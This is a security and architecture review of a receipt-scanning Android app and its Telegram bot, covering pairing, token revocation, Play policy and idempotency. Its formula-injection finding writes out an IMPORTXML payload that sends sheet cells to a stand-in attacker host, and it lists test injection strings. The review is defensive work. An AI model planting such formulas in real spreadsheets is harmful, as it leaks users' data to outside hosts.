# zippp Android Companion & Telegram Pivot - Senior Architecture & Security Review

**Review target:** `spec/themes/02-android-telegram-pivot/SPEC-ANDROID-COMPANION.md` (Rev 3.0) and `spec/themes/02-android-telegram-pivot/android-rollout-plan.md`  
**Repository:** `/Users/mm/Dev/adit/zippp`  
**Review mode:** Static, full read of the active contracts and code paths listed below. No code was changed.  
**Review date:** October 2026

---

## 0. Executive verdict

**GO WITH AMENDMENTS**

The architectural direction is sound: a native Android capture client, a web-only billing portal, a server-side pairing flow, and Telegram for notifications. The existing product laws are also the right laws: the Google Sheet is the sole system of record, receipts are never auto-accepted, the verifier strips ungrounded values, and credits are spent atomically in Redis.

The specs as written are **not safe to implement**. Several items are not "later hardening"; they are contract-level blockers that will cause either a broken mobile client, an account-takeover path, a Play Store rejection, or data corruption. The most important are:

1. **Bearer authentication cannot work with the current server.** `currentUser()`, `hasTokens()`, and `loadWorkspace()` all read the `zippp_sid` cookie. `/api/sheets/append` calls `hasTokens()` and `loadWorkspace()` before it reads the request body, so a mobile JWT will get a 401 before any bearer logic runs. Task 1.5 ("update routes") is not enough; the user id must be propagated through every Google helper.
2. **The pairing code is ambiguously specified and, in the strongest reading, fatally weak.** The spec shows `ZIP-842` (three digits) in one place and "6-character alphanumeric" in another. Three digits is 1,000 possibilities. There is no rate limiting, no attempt counter, no atomic consume, no collision-safe generation, no device approval, and no token revocation.
3. **There is no revocation or device binding.** A 30-day bearer token with no `jti`, no device id, and no unpair flow means a lost phone has write access to the user's Google Sheet and the user's credits for 30 days. "Keluar/Logout" in the Android spec only clears local storage.
4. **Play and OTA are in direct conflict.** A Play-distributed app may not download and install an APK from GitHub Releases. The plan also specifies `targetSdk = 34`, which is below the Play minimum for new apps and updates after August 31, 2025. If this is a sideload-only product, say so; if it will be on Play, the OTA engine cannot ship in that build.
5. **Anti-steering can leak through existing server copy.** `/api/sheets/append` currently returns `"No credits. Top up to send."` with `needsCredits: true`. If the Android client renders `data.error`, it displays a purchase prompt. The Telegram low-credit copy also tells the user to open the web dashboard to top up. Both are exactly what the Play policy section is trying to avoid.
6. **Template operations and photo proof are missing from the mobile contract.** The mobile review card has merchant, date, lines, and totals only. `append` accepts only `staff` and `outlet`; `payment`, `purpose`, `customer`, and `photo` are supported by `buildAppendRows` but not parsed by the route. Reimbursement photo proof is absent from the mobile append flow, and month tabs are still a Revision 2 "to build" item.
7. **The sheet write path is formula-injectable.** `appendRows` uses `valueInputOption=USER_ENTERED`. A merchant name, description, or client-supplied date beginning with `=`, `+`, `-`, or `@` becomes a Google Sheets formula. A malicious receipt or a stolen mobile token can write `=IMPORTXML(...)` or `=HYPERLINK(...)` into the user's sheet.
8. **Telegram account linking is underspecified.** `/start link_<token>` has no token format, no TTL, no atomic consume, no private-chat check, and no one-to-one mapping. Binding to `chat_id` alone means a group chat can receive `/saldo` output. Telegram's `start` payload is limited to 64 characters, which a 32-byte hex token plus `link_` exceeds.
9. **"Encrypted DataStore" is not a Jetpack artifact.** DataStore has no built-in encryption. `androidx.security:security-crypto` (`EncryptedSharedPreferences` / `MasterKey`) is in maintenance/deprecated status in recent releases. The spec must name a concrete Keystore strategy, and the app must disable backups or exclude the token file.
10. **Append idempotency is incomplete.** `scan:${scanId}` is a global key, not namespaced by user, and there is no stored append result. If the sheet write succeeds but the response is lost, the client retries, gets a 409 "already sent", and may show an error even though the row exists. If the process dies after spend but before append, no refund happens.

**Recommendation:** Treat Phase 0 below as mandatory. Do not start Phase 1 coding until the P0 items are amended in the two specs and the contract tests are written. After those amendments, the plan is executable.

### What is already good

- The Google Sheet remains the only destination. The mobile app does not introduce a second receipt database.
- The Review FSM keeps an explicit human confirmation (`Terima`) before append.
- `verifyReceipt` is a strong deterministic grounding layer; its `flags`, `nulled`, `severity`, and `retry` outputs are useful and should be surfaced, not discarded.
- The ledger's Lua spend and grant scripts are atomic and idempotent on an idempotency key.
- The existing data-boundary test is the right kind of static guard: it asserts that the photo path and the Google path do not import each other.
- The existing WhatsApp code already contains useful precedents: a short-lived link token, a per-user link store, and a review flow. Telegram and pairing should reuse those patterns, not invent weaker ones.

---

## 1. Repository context and evidence

The following files were read in full or in the relevant depth before this review:

| Area | Files |
|---|---|
| Rules | `AGENTS.md`, `spec/README.md`, `spec/wording.txt` (relevant keys), `spec/themes/01-mvp/LATER.md` |
| Product | `spec/themes/01-mvp/SPEC.md`, `spec/themes/01-mvp/ARCHITECTURE.md`, `spec/themes/01-mvp/USER-FLOW.md`, `spec/themes/01-mvp/TEMPLATES.md`, `spec/themes/01-mvp/PRICING.md`, `spec/themes/01-mvp/AUDIT-2026-10.md` |
| New pivot | `spec/themes/02-android-telegram-pivot/SPEC-ANDROID-COMPANION.md`, `spec/themes/02-android-telegram-pivot/android-rollout-plan.md` |
| Boundary | `src/lib/data-boundary.test.ts` |
| Verifier | `src/lib/verify-receipt.ts`, `src/types/receipt.ts`, `src/lib/correction-diff.ts` |
| Billing | `src/lib/billing/ledger.ts`, `redis.ts`, `config.ts`, `kasera.ts`, `paddle.ts`, `orders.ts`, `referral.ts` |
| Auth/session | `src/lib/auth.ts`, `src/lib/google/session.ts`, `token-store.ts`, `workspace-store.ts`, `oauth.ts`, `sheets.ts` |
| Routes | `src/app/api/auth/*`, `src/app/api/extract/route.ts`, `src/app/api/sheets/append/route.ts`, `src/app/api/corrections/route.ts`, `src/app/api/billing/balance/route.ts`, `src/app/api/kasera/webhook/route.ts`, `src/app/api/paddle/webhook/route.ts`, `src/app/api/wa/*` |
| Telegram | `src/lib/telegram.ts`, all `sendTelegram` call sites |
| WhatsApp | `src/lib/wa/*`, `src/components/app/WaLinkPanel.tsx`, Settings |
| UI | `src/components/app/AppProvider.tsx`, `screens/SnapScreen.tsx`, `draft.ts`, `AppShell.tsx` |
| Toolchain | `package.json`, `tsconfig.json`, `next.config.ts`, `.env.example`, `.gitignore` |
| Host | macOS version, Android Studio, JDK, SDK, build-tools, Gradle availability |

**Limitations:** This is a static review. `npm test`, `next build`, and Android Gradle tasks were not run. The Android project does not exist yet, and there is no system Java or Gradle on `PATH`; the Android build cannot be executed without a committed wrapper and `JAVA_HOME`.

**Host findings:**

- macOS 13.7.8, x86_64.
- Android Studio 2024.3 installed.
- Bundled JBR is OpenJDK 21.0.6. There is no system `java`, `javac`, or `gradle` on `PATH`.
- Android SDK has platforms 34, 35, 36; build-tools 30.0.3 through 36.0.0; platform-tools and emulator present.
- No Gradle wrapper exists in the repo yet.
- No CI workflow exists in the repo.

This means the Android project is feasible on this machine, but only if the Gradle wrapper is committed and `JAVA_HOME` is pointed at the Studio JBR (or a JDK 21 install). The existing "run `./gradlew assembleDebug`" gate will fail immediately on the current shell as-is.

---

## 2. Compliance and security audit

### 2.1 High risks

#### H1. Bearer auth is not implementable with the current server session model

**Evidence**

- `src/lib/auth.ts`: `currentUser()` calls `hasTokens()`, which calls `sessionUserId()`.
- `src/lib/google/token-store.ts`: `hasTokens()`, `loadTokens()`, `peekGoogleUserId()`, and `peekGoogleEmail()` all read the `zippp_sid` cookie through `sessionUserId()`.
- `src/lib/google/workspace-store.ts`: `loadWorkspace()` and `deleteWorkspace()` also use `sessionUserId()`.
- `src/app/api/sheets/append/route.ts` calls `hasTokens()` and `loadWorkspace()` at the top, before parsing the body. There is no `Authorization` header read anywhere in the route.
- `appendRows(..., userId?)`, `loadTokensForUser()`, and `loadWorkspaceForUser()` already exist, so the plumbing is partially present. But `getSpreadsheetMeta`, `getHeaderRow`, `writeHeaderRow`, `findZippSpreadsheets`, `createTemplateSpreadsheet`, and future month-tab/Drive helpers do not consistently accept a user id.
- `src/app/api/corrections/route.ts` and `src/app/api/billing/balance/route.ts` also call `currentUser()`, so mobile correction telemetry and the mobile credit pill will not work with a bearer token.

**Impact**

The Android client will pair successfully, then every `POST /api/sheets/append` will return 401 "Not signed in with Google." If someone "fixes" this by setting a session cookie in the mobile login response, the mobile request becomes cookie-authenticated, which defeats the bearer model and creates cross-device/session ambiguity.

**Required amendment**

Introduce a request-scoped auth resolver, for example `src/lib/auth/request-user.ts`:

```ts
type RequestUser = {
  userId: string;
  email: string | null;
  admin: boolean;
  source: "web" | "mobile";
  deviceId?: string;
  scope?: "mobile_scan";
};

export async function requestUser(req: Request): Promise<RequestUser | null>;
```

Rules:

- If an `Authorization: Bearer` header is present, verify the mobile token, enforce `scope === "mobile_scan"`, check the device record is not revoked, and return `source: "mobile"`.
- Otherwise, fall back to the existing `zippp_sid` session.
- Never accept a mobile token on admin, top-up, invite, or payment routes.
- Pass `userId` explicitly to every store and Google helper on the mobile path. Do not let any helper fall back to `sessionUserId()`.
- Add compile-time pressure: make `loadTokensForUser(userId)` and `loadWorkspaceForUser(userId)` required arguments, and remove optional `userId` from `appendRows` or make the mobile path always pass it.
- Update `append`, `corrections`, `balance`, and the new `mobile/me` endpoint to use `requestUser(req)`.

Also add a test that calls `POST /api/sheets/append` with only a bearer token and no cookie and asserts a successful append for the token's user, and a second test that uses user A's token with user B's workspace id and asserts rejection.

#### H2. Pairing code is ambiguous, weak in the strongest reading, and not brute-force resistant

**Evidence**

- `SPEC-ANDROID-COMPANION.md` §4.1 shows `ZIP-842` (three digits) and says "6-char code".
- §4.1 text says "6-character ephemeral pairing code"; the rollout plan Task 1.2 says "6-character alphanumeric pairing codes (e.g. ZIP-842)".
- The sequence is `GET pair:<CODE>` then `DEL pair:<CODE>`. That is not atomic. Two concurrent claims can both read the code before either deletes it.
- The spec does not specify `SET NX` for generation, so two users can receive the same code.
- The spec does not specify hashing at rest, attempts, lockout, per-IP limits, per-user limits, or monitoring.
- `POST /api/auth/login` collides with the existing `src/app/api/auth/login/route.ts`, which is the web Google OAuth GET route. Next.js can technically host GET and POST in one file, but doing so in the OAuth callback/login file is a maintenance and security mistake.
- The QR payload contains only the same low-entropy code, so scanning is not stronger than typing.
- There is no device approval step. Possession of the code is the only factor.

**Impact**

If the code is three digits, there are 1,000 possibilities. With a 10-minute TTL and a public endpoint, 10 attempts per second covers the entire space in 100 seconds. Even at 1 attempt per second, a targeted code has a 60% chance of being guessed inside its 10-minute life. If the code is six characters from a 32-character alphabet, entropy is about 30 bits, which is acceptable only with aggressive rate limiting. Six characters from a 36-character alphabet is about 31 bits. Neither is safe without limits.

**Required amendment**

- Define the format exactly: **8 characters from Crockford Base32**, displayed as `XXXX-XXXX` (40 bits). Alphabet: `0123456789ABCDEFGHJKMNPQRSTVWXYZ`. Input is case-insensitive and ignores hyphens/spaces.
- Generate with `crypto.randomBytes` or `crypto.randomInt`, never `Math.random`.
- Store only `SHA-256(code)` in Upstash as `auth:pair:<hash>` with `{ userId, expiresAt, attempts, createdAt }`.
- Use a `SET NX` loop for generation; if the hash already exists, generate again.
- TTL: 10 minutes. One active code per user; generating a new one deletes the previous.
- Atomic consume: `GETDEL` or a Lua script that returns the value and deletes it in one operation.
- Limits: 5 attempts per code, 10 attempts per IP per 10 minutes, 20 attempts per user per hour, exponential lockout after the fifth failure. Return the same generic `401 INVALID_PAIRING_CODE` for invalid, expired, used, and locked codes. Do not reveal which condition applied.
- Rate-limit `POST /api/auth/pair/generate` per web session (for example 5 per hour) and invalidate prior unused codes.
- Rename the mobile exchange endpoint to `POST /api/auth/pair/claim` (or `/api/mobile/auth/claim`). Do not add a POST handler to the existing OAuth login route.
- Strongly consider a device approval step: the Android claim creates a pending request with device name, platform, and app version; the web session sees "Approve device" and the token is issued only after approval. This makes guessing a code useless and gives the user a recognizable device list. If device approval is not in v1, the 8-character format and strict limits are mandatory.

**Entropy note for the report:** 8 Crockford characters = 32^8 = 1,099,511,627,776 combinations (40 bits). That is safe against online guessing with the limits above. Six characters = 32^6 = 1,073,741,824 (30 bits), which is only safe with the limits; three digits = 1,000, which is never safe.

#### H3. No token revocation, device binding, or lost-phone flow

**Evidence**

- The JWT is valid for 30 days. The spec does not include `jti`, `device_id`, `aud`, `iss`, or a token version.
- The Android Settings screen lists "Device info, Telegram support link, Keluar/Logout". There is no server-side unpair call.
- The web dashboard has no "connected devices" list.
- `src/app/api/auth/logout/route.ts` deletes Google tokens and workspace config, but it does not revoke mobile tokens. A previously issued mobile token remains valid for extract; after the user signs in again on the web, the mobile token can append again.
- There is no `POST /api/auth/device/revoke` or equivalent.

**Impact**

A lost or stolen phone retains read/extract access, write access to the user's Google Sheet, and the ability to spend credits for 30 days. Clearing the app's local token does not help if the token was copied from a backup, logs, or a rooted device. A web logout gives the user a false sense of security.

**Required amendment**

- Add a device record per pairing:
  - `device_id` (random UUID generated on Android, stored in DataStore)
  - `device_name` (`Build.MANUFACTURER` + `Build.MODEL`)
  - `platform`, `app_version`
  - `created_at`, `last_seen_at`, `revoked_at`
  - `token_jti` or token hash
- JWT claims must include `jti`, `device_id`, `aud: "zippp-mobile"`, `iss: "zippp.link"`, `scope: "mobile_scan"`, `ver: 1`, `iat`, `exp`.
- Verify the device record on every mobile request. If Redis is unavailable, fail closed with `503` rather than accepting an unrevoked token.
- Add `POST /api/auth/logout` for mobile: revoke the current device, then clear the local token.
- Add `GET /api/auth/devices` and `POST /api/auth/device/revoke` for the web session. Settings should show a "Perangkat terhubung" list with device name, last seen, and a "Putuskan" button. Include a "Putuskan semua perangkat" action.
- On revocation, the next mobile request returns `401 DEVICE_REVOKED`; the app clears the token and returns to the pairing screen.
- Add a pairing alert through Telegram and, ideally, email: "Perangkat baru terhubung: <device>. Jika ini bukan Anda, putuskan di web." Do not include the full Google user id.
- Consider replacing the JWT with an opaque 32-byte random token stored as `SHA-256(token)` in Redis with a 30-day TTL and a device record. Because revocation already requires a Redis lookup, the stateless benefit of JWT is gone, and opaque tokens remove JWT algorithm/secret management risk. If JWT stays, add `kid` and previous-secret rotation support.

#### H4. Play compliance is not established, OTA conflicts with Play, and `targetSdk 34` will be rejected

**Evidence**

- §3 claims the "Inkdrop Model" gives a "0% Play Store fee listing". The spec's constraints are necessary but not sufficient. Google's reader app program is for apps that provide access to previously purchased content, with declared eligibility categories. A receipt-scanning SaaS companion is not obviously a reader app. Google may still treat externally purchased credits that fund an in-app service as a digital service. The correct posture is "companion app with no IAP and no purchase UI", not "guaranteed reader app".
- §5 says Phase 1 is distributed as a direct APK from GitHub Releases and the app self-updates by downloading that APK. Google Play's Device and Network Abuse policy prohibits apps distributed via Play from downloading and installing executable code outside Play. A Play build cannot contain this OTA installer.
- Rollout Task 2.1 sets `targetSdk = 34`. Google Play's target API requirement moved to API 35 for new apps and updates after August 31, 2025. In October 2026, a new Play submission targeting 34 will be rejected. Plan for API 35, and check whether API 36 is required by the submission date.
- The plan has no Play Console tasks: Data Safety form, privacy policy URL, target audience, content rating, account deletion path, permission declarations, or `REQUEST_INSTALL_PACKAGES` handling.

**Impact**

If the team submits this as-is, the most likely outcomes are: rejection for target API level, rejection or removal for self-update, or a Payments policy review that forces Play Billing. If the app is sideload-only, the Play section is aspirational and should not drive the design.

**Required amendment**

- Decide the distribution channel explicitly:
  - **Channel A, sideload only:** GitHub Releases APK, own OTA engine, `REQUEST_INSTALL_PACKAGES`, no Play listing. This is the only channel where the current OTA design is legal.
  - **Channel B, Play:** separate `play` build flavor with no GitHub OTA, no APK download, no `REQUEST_INSTALL_PACKAGES`; use Play In-App Updates (`app-update` library). The `/api/app-version` endpoint can return a Play URL or be ignored by this flavor.
- Set `compileSdk = 35`, `targetSdk = 35` (or the current Play minimum at submission), `minSdk = 26`. Update AGP/Gradle/Kotlin accordingly (see the toolchain section).
- Add a Play Console checklist phase: Data Safety, privacy policy, target audience, content rating, permission declarations, account deletion path, and a policy review of every string that mentions credits, top-up, purchase, subscription, or the website.
- Do not use "Inkdrop compliant" in legal or user-facing copy. Say "companion app with no in-app purchases" and have a fallback plan if Play rejects: either enable Play Billing with a separate SKU or remain sideload-only.
- Build an Android App Bundle (`.aab`) for Play, not only an APK. A universal APK with Compose, CameraX, and bundled ML Kit may exceed the 15 MB target.

#### H5. Anti-steering can leak through server copy and Telegram

**Evidence**

- `src/app/api/sheets/append/route.ts` returns `"No credits. Top up to send."` with `needsCredits: true` at the 402 branch.
- `spec/wording.txt` contains `app.credits.none.en` = "No credits. Top up to keep scanning." and the Indonesian equivalent "Kredit habis. Isi saldo untuk melanjutkan."
- `spec/wording.txt` also has `app.wa.needCredits` = "Top up credits first: {url}" and "Isi kredit dulu: {url}".
- The new spec's zero-credit copy is neutral, but it does not say "never render server error text". The Android client could easily use `data.error` in a toast.
- The Telegram low-credit copy in §7.2 says "Buka dashboard web untuk isi ulang agar proses pencatatan tidak terhenti." That is a purchase prompt sent to the user's phone by the service.
- The review card's primary button is "⚡ 1 kredit" and the header shows "⚡ 85 kredit". A Play reviewer may read this as a virtual currency tied to an external purchase.
- The zero-credit copy says "Periksa akun Anda atau hubungi admin." If support sells credits through Telegram, that is an anti-steering channel in practice.

**Impact**

Play Payments policy review can fail even if there is no checkout screen, because the app tells the user where to buy. A leaked server string is enough.

**Required amendment**

- Server responses must include machine codes, not user-facing purchase copy, for mobile:
  - `402 { ok: false, code: "NO_CREDITS", credits: 0 }`
  - No `"Top up"` string in the mobile response. Keep the web copy in the web path if needed.
- The Android client must map codes to Android strings and must never render arbitrary server `error` text in a dialog, toast, or banner.
- Replace all Android-visible currency language:
  - "kredit" -> "scan" or "kuota scan"
  - "saldo" -> "sisa scan" (or "kuota")
  - No "isi ulang", "top up", "beli", "purchase", "langganan", "subscribe", "website", or "zippp.link" in the app resources, except the privacy policy and support URLs.
- Remove the cost from the primary button. Use `Terima` only. Show `Sisa scan: 85` in the header. If a cost must be shown, use `1 scan`, not `1 kredit`.
- Zero-credit state:
  - Copy: `Kuota scan habis. Pemindaian baru belum tersedia.`
  - Buttons: `Muat ulang` and `Bantuan`.
  - No purchase button, no web link, no "hubungi admin untuk membeli".
- Telegram low-credit alert:
  - Copy: `Sisa {n} scan. Buka zippp di web untuk melihat detail akun.`
  - No "isi ulang", no payment link. Make low-credit alerts opt-in.
- Add a CI grep over `android/app/src/main/res/values*/strings.xml` for purchase terms. Allow only the privacy policy URL and support URL.
- Update `spec/wording.txt` with Android-specific keys so the copy is centralized. Do not hardcode it in the spec and again in Kotlin.

#### H6. Google Sheets formula injection through `USER_ENTERED`

**Evidence**

- `src/lib/google/sheets.ts` `appendRows()` sets `valueInputOption: "USER_ENTERED"`.
- `src/lib/google/templates.ts` `buildAppendRows()` writes `receipt.merchant`, `line.description`, `receipt.date`, `receipt.currency`, and other client-supplied strings without escaping.
- `src/components/app/draft.ts` `fromDraft()` accepts arbitrary user text.
- The mobile app will send OCR text and user edits. A receipt image can contain `=IMPORTXML("https://attacker.example/?x="&A1,"//x")` as the merchant name, or a user can type it.

**Impact**

When the user opens the sheet, Google Sheets evaluates the formula. That can make external requests, exfiltrate adjacent cells, or create misleading links. The sheet is the user's system of record, so this is both a security and a data-integrity problem. The existing `Photo` column intentionally writes `=HYPERLINK(...)`, so a blanket ban on formulas is not possible; the fix must distinguish trusted formulas from untrusted text.

**Required amendment**

- Add `escapeSheetText(value: string): string` in `src/lib/google/templates.ts` or a new `sheet-safe.ts`:
  - If the value starts with `=`, `+`, `-`, `@`, tab, or carriage return, prefix a single quote `'`.
  - Apply to every text field sourced from OCR or the client: merchant, description, date, currency, category, staff, outlet, payment, purpose, customer, notes.
  - Keep numbers as numbers.
  - Keep `Photo` and other deliberate formulas in a separate trusted path that is constructed only from server-generated URLs, never from user text.
- Validate `date` as `YYYY-MM-DD` or null; validate `currency` as three uppercase letters or null; cap description/merchant to 500 characters; cap line items to 200.
- Add unit tests with payloads: `=1+1`, `+SUM(A1:A2)`, `-2+3`, `@cmd`, `\t=1`, and a quoted URL. Assert the cell starts with `'` for text fields and that the trusted Photo formula is unchanged.

#### H7. Mobile contract is missing template ops, photo proof, and workspace state

**Evidence**

- `POST /api/auth/login` response in §4.2 includes `spreadsheet_name`, `spreadsheet_id`, `template_id`, but not `staff_names`, `outlets`, `default_outlet`, `photo_proof`, `headers`, or `column_map`.
- §6.1 Review card lists merchant, date, line items, subtotal, tax, service charge, total. It does not list template ops. `service_charge` is not a field in `src/types/receipt.ts`; it cannot be displayed without inventing a field or mapping it to tax.
- `src/app/api/sheets/append/route.ts` parses only `receipt`, `staff`, `outlet`, and `scanId`. `BuildAppendRowsInput` supports `payment`, `purpose`, `customer`, `photo`, and `receipt_id`, but the route never passes them.
- `ARCHITECTURE.md` says append accepts `{ receipt, scanId, ops, image? }`, but the actual route does not accept `ops` or `image`.
- `TEMPLATES.md` says photo proof is on by default for `reimbursement`, and month tabs are derived from the receipt date. `AUDIT-2026-10.md` says the month-tab, daily-block, and Drive modules are still "to build".
- `src/lib/verify-receipt.ts` exports `isSoftFlag()` and `hardFlagCount()`, but no UI uses them. The web `ConfirmCard` only checks for empty lines and an empty price; it does not render or gate on verifier flags.
- Phase 4's exit gate says "row appears in the user's Google Sheet", which can pass with the old single tab and no photo, hiding the gap.

**Impact**

- Sonny cannot set staff/outlet from the Android app, so `resto-inventory` rows are incomplete.
- Fais cannot set payment/customer, so `sales-recap` rows are incomplete.
- Bagas gets no photo proof, which is the core reimbursement feature.
- Month tabs and daily totals are not written, so the mobile app does not meet the product's definition of done.
- If the receipt date is null, there is no rule for which month tab to use; the append path can fail or land in the wrong tab.

**Required amendment**

- Expand the mobile login or add `GET /api/mobile/workspace` with a safe workspace DTO:

```json
{
  "ready": true,
  "spreadsheet_name": "Pengeluaran 2026",
  "template_id": "resto-inventory",
  "headers": ["Date", "Supplier", "..."],
  "column_map": { "date": "Date", "merchant": "Supplier" },
  "staff_names": ["Sonny"],
  "outlets": ["Pusat", "Cabang"],
  "default_outlet": "Pusat",
  "photo_proof": false
}
```

- Do not return `spreadsheet_id` unless the app actually needs to open the sheet. If it does, treat it as a Google identifier and disclose it in the Play Data Safety form. A `spreadsheet_name` is enough for the header.
- Define an `ops` object in the append contract:

```json
{
  "scanId": "uuid",
  "receipt": { "...": "..." },
  "ops": {
    "staff": "Sonny",
    "outlet": "Pusat",
    "payment": "QRIS",
    "purpose": "Client lunch",
    "customer": "Budi"
  }
}
```

- Validate `ops` on the server:
  - `staff` must be in `workspace.staff_names` when that list is non-empty.
  - `outlet` must be in `workspace.outlets`, or fall back to `default_outlet`; if multiple outlets exist and none is supplied, return `400 OUTLET_REQUIRED`.
  - `payment` must be one of the template's allowed values.
  - `purpose` and `customer` are length-limited strings.
- Add photo proof to the mobile append contract. Two acceptable designs:
  - `POST /api/sheets/append` accepts `multipart/form-data` with `receipt` JSON and `image`; or
  - `POST /api/mobile/receipts` uploads the image and returns a short-lived `photo_upload_id`; `append` consumes it.
  - The route must pass `userId` to the Drive helper and return `photo` or `photo_error` in the response. On append failure, trash the uploaded file and refund.
- Add the month-tab/daily-block/Drive work as an explicit dependency before Phase 4's exit gate, or scope Phase 4 to the existing single tab and move the month-tab gate to Phase 4.5.
- Define date handling:
  - If `receipt.date` is null, the client fills the capture date and sets `date_assumed: true`.
  - The server uses the receipt date (or the assumed capture date) to choose the month tab.
  - The assumed date is written to the sheet but never presented as OCR-grounded. The correction telemetry must exclude assumed dates from "wrong and unflagged".
- Remove "service charge" from the mobile screen unless a real field is added to `Receipt` and to the extractor. Do not invent it. If the receipt has a service charge, the current model maps it into tax or leaves it out; document which.

#### H8. Telegram account linking and webhook are underspecified

**Evidence**

- §7.3 says `/start link_<token>` connects the user's Telegram `chat_id` to their Zippp account. It does not define the token, how it is minted, TTL, entropy, single-use behavior, or hashing.
- The existing WhatsApp code has a better pattern: `mintLinkToken()` uses 16 random bytes (32 hex), a 15-minute TTL, and `consumeLinkToken()`. But `consumeLinkToken()` does `GET` then `DEL`, which is not atomic.
- Binding to `chat_id` alone is unsafe in groups: any group member could run `/saldo` and see the linked user's balance and sheet title.
- Telegram's `start` parameter is limited to 64 characters. A 32-byte hex token is 64 characters; `link_` makes 69, which Telegram will truncate or reject.
- The webhook has no `update_id` deduplication, no rate limit, no explicit constant-time secret comparison, and no HTML escaping for dynamic values in `sendTelegram`.
- `src/lib/telegram.ts` already exists as a file. The new spec puts code in `src/lib/telegram/bot.ts` and `alerts.ts`, creating a file/directory naming conflict.
- The low-credit alert is proposed inside `ledger.ts`, which is the billing-critical atomic path. That couples a Redis Lua spend to an external network call and can create an import cycle.

**Impact**

A forwarded link can bind an attacker's Telegram account. A group chat can leak balance and sheet name. A truncated token fails silently. Webhook replay can duplicate messages. A Telegram outage can slow or break credit spending if the call is placed in the ledger path.

**Required amendment**

- Token:
  - Generate `randomBytes(16).toString("hex")` (32 chars, 128 bits) or `randomBytes(24).toString("base64url")` (32 chars, 192 bits). With `link_`, both are under the 64-character start payload limit.
  - Store `SHA-256(token)` as `tg:link-token:<hash>` with `{ userId, expiresAt }`, TTL 10 minutes.
  - Consume atomically with `GETDEL` or a Lua script. One use only.
- Binding:
  - Require `message.chat.type === "private"`. Reject groups and supergroups with a generic message.
  - Use `message.from.id` as the Telegram user id, not `chat_id` alone. Store both, but key the link on the numeric Telegram user id.
  - Enforce one Telegram account per Zippp user and one Zippp user per Telegram account. If a different account tries to link, require an explicit web-side transfer.
  - Add `tg:link:<telegramUserId>` -> `{ userId, chatId, linkedAt }` and `tg:user:<userId>` -> `telegramUserId`.
  - Add `/unlink` and a web "Putuskan Telegram" button.
- Webhook:
  - Verify `X-Telegram-Bot-Api-Secret-Token` with `timingSafeEqual` after a length check.
  - Deduplicate `update_id` with `SET NX` and a 24-hour TTL.
  - Rate-limit per Telegram user and globally.
  - Return 200 for ignored updates, 401 for bad secret, 400 for malformed JSON.
  - Never log the bot token or raw update bodies containing personal data.
- Outbound messages:
  - Use `parse_mode: "HTML"` only for static templates. Escape `&`, `<`, `>` in dynamic values (email, sheet title, device name).
  - Keep admin alerts (`TELEGRAM_CHAT_ID`) separate from user alerts. Add `TELEGRAM_ADMIN_CHAT_ID` or document that the existing `TELEGRAM_CHAT_ID` remains admin-only.
  - Send low-credit alerts after the spend succeeds, not inside `ledger.ts`. Deduplicate with `tg:low:<userId>:<thresholdEpoch>` and reset when the balance rises above the threshold.
  - Send top-up confirmation after `grant()` and `onTopupApproved()` succeed, idempotent on the order id.
  - Send pairing alert after a device is paired, with device name and a revocation instruction.
  - A Telegram failure must never block billing, append, or pairing. Use a short timeout and fire-and-forget with structured logging.
- Privacy:
  - Telegram is a third-party processor. Sending email, balance, and sheet title to Telegram must be disclosed in the privacy policy and must be opt-in at link time.
  - Do not accept receipt images in the Telegram bot in v1. If added later, it becomes a new receipt image path and needs its own disclosure and retention policy.

#### H9. Token storage: "Encrypted DataStore" is not a real Jetpack API, and backups can leak the JWT

**Evidence**

- §4.1 says `EncryptedDataStore.save(JWT)`.
- Rollout Task 2.2 adds "Jetpack DataStore Preferences & Security (`androidx.security:security-crypto`)".
- Jetpack DataStore has no built-in encryption. `androidx.security:security-crypto` provides `EncryptedSharedPreferences` and `EncryptedFile`; it does not provide `EncryptedDataStore`. The Security Crypto library is also in maintenance/deprecated status in recent AndroidX releases.
- The manifest tasks in Phase 2 mention only `CAMERA`, `INTERNET`, and `ACCESS_NETWORK_STATE`. There is no `android:allowBackup="false"`, no `dataExtractionRules`, no `fullBackupContent`, and no `networkSecurityConfig`.
- Android 12+ can back up app data to Google Drive by default. A JWT in DataStore can leave the device.

**Impact**

A copied or backed-up token grants 30 days of sheet write and credit spend. A token written to logs or crash reports has the same effect.

**Required amendment**

- Pick one concrete storage design:
  - **Option A:** DataStore Preferences stores a ciphertext blob; a `TokenCipher` uses an Android Keystore AES-256-GCM key (`setUserAuthenticationRequired(false)`, `setRandomizedEncryptionRequired(true)`), with a random 12-byte IV per write and the IV stored alongside the ciphertext.
  - **Option B:** `EncryptedSharedPreferences` with `MasterKey` AES-256-GCM. If used, pin the dependency version and note its maintenance status.
- Add `android:allowBackup="false"` and `android:dataExtractionRules` / `android:fullBackupContent` that exclude the token store, even if backups are disabled.
- Add `android:debuggable="false"` in release; never log the token, Authorization header, pairing code, or email.
- Add `android:usesCleartextTraffic="false"` and a `networkSecurityConfig` that allows only HTTPS. For local development, use a debug-only manifest with cleartext to `10.0.2.2`.
- Consider `FLAG_SECURE` on the pairing and review screens if screenshots are a concern; at minimum, do not show the token.
- If the app uses a WebView for support or privacy, do not enable JavaScript or file access unnecessarily.

#### H10. Append idempotency, refund, and lost-response semantics are incomplete

**Evidence**

- `src/lib/billing/ledger.ts` keys idempotency as `bill:idem:scan:${scanId}` from `src/app/api/sheets/append/route.ts`. The key is global, not namespaced by user.
- `scanId` is generated by the client (`crypto.randomUUID()` in the web app; the mobile spec does not define it). A malicious client can choose any value.
- `refundScan()` deletes the idempotency key and grants a new credit lot with a fresh 30-day expiry.
- There is no server-side record of the append result. If the Sheets API write succeeds but the response is lost, retrying the same scan returns 409 "This scan was already sent."
- If the Vercel function is killed after `spend()` but before `appendRows()` or the catch block, no refund happens and no row is written.

**Impact**

- A user sees an error after a successful append and may scan the receipt again, creating a duplicate row.
- A user can lose a credit with no row.
- A refund can extend a credit's life beyond the original 30-day lot.
- Cross-user scan id collisions can cause a denial of service (victim gets 409) if an attacker learns a scan id.

**Required amendment**

- Server-issue the `scanId` at `POST /api/extract` and return it with the receipt. Store `scan:owner:<scanId>` -> `{ userId, runId, createdAt }` with a TTL (for example 1 hour).
- Namespace all idempotency keys by user: `scan:${userId}:${scanId}`. Validate `scanId` as a UUID and verify ownership before append.
- Store the append result: `scan:result:<userId>:<scanId>` -> `{ ok, rows_written, sheet_tab, photo, at }` with a TTL of at least 24 hours. On a duplicate spend, return the stored result with `duplicate: true` and `200`, not a bare 409.
- If the client retries after a timeout, it should call `GET /api/mobile/scans/<scanId>` first, or treat a `409 SCAN_ALREADY_SENT` with a stored result as success.
